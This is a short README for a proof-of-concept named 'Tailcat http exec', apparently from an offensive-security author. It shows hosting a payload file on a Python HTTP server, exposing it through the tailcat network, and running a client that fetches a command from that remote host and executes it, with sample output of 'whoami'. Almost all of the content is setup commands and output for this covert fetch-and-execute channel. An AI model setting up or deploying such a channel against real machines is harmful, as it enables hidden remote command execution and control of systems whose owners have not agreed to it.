# Tailcat http exec

A POC for using the tailcat service to fetch a payload

## Setup the listening server

```
python3 -m http.server 8080
```

Start a python http server (ensure you have a file called payload.txt in the current directory)

```
tailcat serve 8080
```

Serve port 8080 on the tailcat network

## Run the client over tailcat

```
./client tcXXXXXXXXX
2026/09/07 20:06:01 received command: whoami
2026/09/07 20:06:01 command output:
sneakerhax
```

Start the client and pass the tailcat address output by the server as an argument

## References
* [Github - Tailcat](https://github.com/tailscale/tailcat)
